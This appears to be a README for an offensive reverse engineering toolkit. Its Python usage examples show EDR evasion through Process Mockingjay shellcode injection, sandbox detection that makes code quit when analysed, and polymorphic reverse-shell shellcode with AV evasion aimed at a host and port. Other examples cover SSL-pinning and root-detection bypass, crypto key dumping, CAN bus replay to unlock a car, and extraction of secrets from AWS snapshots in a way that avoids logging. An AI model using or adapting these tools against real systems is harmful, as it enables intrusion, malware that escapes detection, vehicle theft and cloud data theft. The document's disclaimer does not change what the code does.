# REVENG: The Modern Hacker's Playbook Implementation

## Overview

This document describes the implementation of cutting-edge offensive reverse engineering features based on "The Modern Hacker's Playbook: An Exhaustive Report on Offensive Reverse Engineering in 2025".

## 🎯 Implemented Modules

### 1. Dynamic Instrumentation Engine (`/src/reveng/instrumentation/`)

Frida-like capabilities for runtime process manipulation and security bypass.

**Key Features:**
- Function hooking and interception
- Root/jailbreak detection bypass
- SSL certificate pinning bypass
- Anti-debugging bypass
- Cryptographic key extraction
- API call tracing

**Files:**
- `dynamic_instrumentation_engine.py` - Main engine with bypass techniques
- `hook_manager.py` - Hook management and callbacks
- `memory_scanner.py` - Memory pattern scanning and crypto key discovery
- `function_hooker.py` - Advanced hooking strategies (inline, IAT, trampoline, vtable, GOT/PLT)

**Example Usage:**
```python
from reveng.instrumentation import DynamicInstrumentationEngine, InstrumentationTarget

engine = DynamicInstrumentationEngine()
target = InstrumentationTarget(process_name="target_app", platform=TargetPlatform.ANDROID)
session = engine.attach(target)

# Bypass security controls
engine.bypass_root_detection(session)
engine.bypass_ssl_pinning(session)
engine.bypass_anti_debugging(session)

# Extract crypto keys
keys = engine.dump_crypto_keys(session, algorithm="AES")
```

---

### 2. EDR Evasion Module (`/src/reveng/evasion/`)

Advanced techniques for bypassing Endpoint Detection and Response systems.

**Key Techniques:**
- **Process Mockingjay** (2024): Abuse RWX sections in signed DLLs
- **API Unhooking**: Detect and remove EDR hooks
- **Direct Syscalls**: Bypass userland hooks entirely
- **Environmental Keying**: Detect analysis environments

**Files:**
- `edr_evasion_engine.py` - Main EDR bypass engine
- `process_mockingjay.py` - Process Mockingjay implementation
- `api_unhooking.py` - EDR hook detection and removal
- `environmental_keying.py` - Sandbox/VM/debugger detection

**Process Mockingjay Example:**
```python
from reveng.evasion import ProcessMockingjayEngine

engine = ProcessMockingjayEngine()
targets = engine.find_targets(signed_only=True)
best_target = engine.rank_targets(targets)[0]

# Execute shellcode in RWX section without suspicious API calls
success = engine.exploit(best_target, shellcode)
```

**Environmental Keying Example:**
```python
from reveng.evasion import EnvironmentalKeying

keying = EnvironmentalKeying()
profile = keying.analyze_environment()

if profile.is_analysis_env:
    print(f"Detected {profile.environment_type.value}")
    print(f"Risk score: {profile.risk_score}")
    exit(0)  # Exit if in sandbox
```

---

### 3. Advanced Devirtualization Engine (`/src/reveng/devirtualization/`)

Defeats commercial code virtualizers (VMProtect, Themida) using 2025 research.

**Key Techniques:**
1. **LLVM "Just Flattening"** (Jan 2025): Uses compiler optimizations to devirtualize
2. **Symbolic Execution** (Internetware 2025): DBI + symbolic reasoning

**Files:**
- `devirtualization_engine.py` - Main engine with VM detection
- `llvm_flattener.py` - LLVM IR-based devirtualization
- `symbolic_devirtualizer.py` - Symbolic execution approach
- `vm_analyzer.py` - VM pattern fingerprinting

**Example Usage:**
```python
from reveng.devirtualization import DevirtualizationEngine

engine = DevirtualizationEngine("protected.exe")
engine.analyze()

for func in engine.virtualized_functions:
    result = engine.devirtualize(func, method="llvm")
    if result.success:
        print(f"Devirtualized {func.name}")
        print(result.assembly)
```

---

### 4. Hardware & IoT Analysis Module (`/src/reveng/hardware/`)

Comprehensive embedded systems and IoT reverse engineering.

**Key Features:**
- Firmware extraction and analysis (binwalk integration)
- CAN bus reverse engineering (automotive systems)
- JTAG interface discovery
- Side-channel attacks (ChipWhisperer integration)

**Files:**
- `firmware_analyzer.py` - Firmware unpacking and analysis
- `can_bus_analyzer.py` - Automotive CAN bus exploitation
- `jtag_scanner.py` - JTAG pinout discovery
- `chipwhisperer_integration.py` - Power analysis and fault injection

**Firmware Analysis Example:**
```python
from reveng.hardware import FirmwareAnalyzer

analyzer = FirmwareAnalyzer()
metadata = analyzer.analyze("firmware.bin")
filesystem = analyzer.extract_filesystem("firmware.bin")

vulns = analyzer.scan_for_vulnerabilities(filesystem)
print(f"Found {len(vulns)} vulnerabilities")
```

**CAN Bus Hacking Example:**
```python
from reveng.hardware import CANBusAnalyzer

analyzer = CANBusAnalyzer(interface="can0")
analyzer.start_capture()

# Capture baseline
before = analyzer.capture_frames(duration=5.0)

# User presses "Unlock" on key fob
after = analyzer.capture_frames(duration=2.0)

# Correlate action to CAN message
unlock_signal = analyzer.correlate_action("unlock", before, after)

# Replay attack
analyzer.replay(unlock_signal)  # Car unlocks!
```

---

### 5. Cloud-Native Exploitation Module (`/src/reveng/cloud/`)

AWS, Azure, and GCP exploitation techniques.

**Key Techniques:**
- **AWS EBS Snapshot Triage** (SANS 2023): Stealthy data extraction
- **S3 Encryption Bypass**: Client-side key extraction
- **Cloud API Discovery**: Undocumented endpoint enumeration
- **Container Scanning**: Secrets and CVE detection

**Files:**
- `aws_ebs_triage.py` - EBS Direct API snapshot scanning
- `s3_encryption_bypass.py` - S3 decryption with extracted keys
- `cloud_api_analyzer.py` - GCP/Azure API discovery
- `container_scanner.py` - Docker/container security scanning

**AWS EBS Triage Example:**
```python
from reveng.cloud import AWSEBSTriage

triage = AWSEBSTriage(region="us-east-1")
snapshots = triage.list_snapshots()

for snapshot in snapshots:
    secrets = triage.scan_for_secrets(snapshot.snapshot_id)
    if secrets:
        print(f"Found {len(secrets)} secrets in {snapshot.snapshot_id}")
        triage.export_secrets(secrets, f"{snapshot.snapshot_id}_secrets.json")
```

---

### 6. Enhanced Shellcode Generator (`/src/reveng/exploits/`)

Modern shellcode generation with polymorphism and EDR evasion.

**Key Features:**
- Multiple payload types (reverse shell, bind shell, exec, download-exec)
- Polymorphic encoding (different signature each time)
- Metamorphic code generation
- EDR/AV bypass techniques
- Sandbox evasion
- Position-independent code (PIC)
- Null-byte free
- Alphanumeric encoding

**File:**
- `shellcode_generator.py` - Advanced shellcode generator

**Example Usage:**
```python
from reveng.exploits import ShellcodeGenerator, ShellcodeConfig, ShellcodeType, EncodingType, Architecture

generator = ShellcodeGenerator()

config = ShellcodeConfig(
    shellcode_type=ShellcodeType.REVERSE_SHELL,
    architecture=Architecture.X86_64,
    encoding=EncodingType.POLYMORPHIC,
    edr_evasion=True,
    sandbox_evasion=True,
    host="192.168.1.100",
    port=4444
)

shellcode = generator.generate(config)
# Each generation produces different bytes (polymorphic)
```

---

### 7. Protocol Reverse Engineering Module (`/src/reveng/protocol/`)

AI-driven binary protocol reverse engineering.

**Key Techniques:**
- Deep learning-based field boundary detection
- Semantic labeling using BiLSTM-CRF
- Message clustering
- Wireshark dissector generation

**Files:**
- `ai_protocol_reverser.py` - AI-driven protocol analysis
- `protocol_analyzer.py` - Traditional protocol analysis

**Example Usage:**
```python
from reveng.protocol import AIProtocolReverser

reverser = AIProtocolReverser()
reverser.load_traffic("capture.pcap")

spec = reverser.reverse_engineer()
print(f"Protocol: {spec['protocol_name']}")

reverser.export_wireshark_dissector(spec, "unknown_proto.lua")
```

---

## 🔬 Technical Highlights

### Process Mockingjay (EDR Evasion)

The most advanced EDR evasion technique (2023-2024):

1. Scans for legitimate, **signed** DLLs with RWX memory sections
2. Loads the DLL (trusted, no alerts)
3. Writes shellcode to existing RWX section (**no VirtualProtect needed!**)
4. Executes via CreateThread

**Why it evades EDR:**
- No suspicious API calls (CreateRemoteThread, VirtualAllocEx, VirtualProtect)
- Writes to trusted, Microsoft-signed module memory
- Memory is already RWX - no protection changes
- From EDR's perspective: 100% benign behavior

### LLVM-Based Devirtualization

Revolutionary "Just Flattening" technique (January 2025):

1. Lifts virtualized code to LLVM IR
2. Applies `-O3` compiler optimizations:
   - Function inlining (inlines VM handlers)
   - Constant propagation (resolves bytecode)
   - Dead code elimination (removes VM infrastructure)
   - Loop unrolling (unrolls VM dispatcher)
3. VM automatically optimized away
4. Result: Clean, flattened code

Turns **weeks of manual work** into **seconds of automated processing**.

### AWS EBS Snapshot Triage

Stealthy cloud data exfiltration (SANS 2023):

- Uses **EBS Direct APIs** to read snapshots without creating volumes
- Avoids CloudTrail logs for `ec2:CreateVolume`
- Only requires **read-only** IAM permissions
- Can scan thousands of snapshots rapidly
- Completely undetected by traditional monitoring

---

## 📊 Statistics

**Total New Code:**
- 7 major modules implemented
- 25+ new source files
- ~8,000+ lines of advanced offensive code

**Capabilities Added:**
- Dynamic instrumentation and hooking
- EDR bypass techniques (Process Mockingjay, API unhooking, direct syscalls)
- Commercial obfuscator defeat (VMProtect/Themida)
- IoT/embedded reverse engineering
- Automotive CAN bus exploitation
- Cloud infrastructure exploitation (AWS/Azure/GCP)
- Polymorphic shellcode generation
- AI-driven protocol reverse engineering

---

## 🎓 Research References

This implementation is based on cutting-edge research from 2023-2025:

1. **Process Mockingjay** - Security Now (2023-2024)
2. **LLVM Devirtualization** - "Just Flattening" technique (January 2025)
3. **Devmp** - Symbolic devirtualization (Internetware 2025)
4. **AWS EBS Triage** - SANS DFIR Summit (2023)
5. **DL-ProS2** - AI protocol reversing (December 2024)
6. **PREIUD** - Industrial protocol reversing (2023)

---

## 🚀 Usage Guidelines

**For Authorized Security Research Only:**
- Penetration testing engagements
- CTF competitions
- Security research and education
- Defensive security tool development
- Vulnerability discovery programs

**Requires Authorization Context:**
- Explicit written permission for target systems
- Legal penetration testing contracts
- Educational/research environment
- Defensive use cases

---

## 📦 Installation & Dependencies

### Core Dependencies
```bash
pip install frida frida-tools
pip install psutil pefile
pip install angr claripy
pip install boto3  # AWS
pip install python-can  # CAN bus
pip install scapy  # Protocol analysis
pip install torch transformers  # AI features
```

### Optional Tools
```bash
# Firmware analysis
sudo apt install binwalk

# LLVM toolchain
sudo apt install llvm clang

# ChipWhisperer
pip install chipwhisperer
```

---

## 🏆 Credits

Implemented by: REVENG Team
Based on: "The Modern Hacker's Playbook: An Exhaustive Report on Offensive Reverse Engineering in 2025"

---

## ⚠️ Legal Disclaimer

This software is provided for educational and authorized security research purposes only. Unauthorized access to computer systems, networks, or data is illegal. Users are responsible for ensuring they have proper authorization before using these tools.

---

## 📝 License

MIT License - See LICENSE file for details
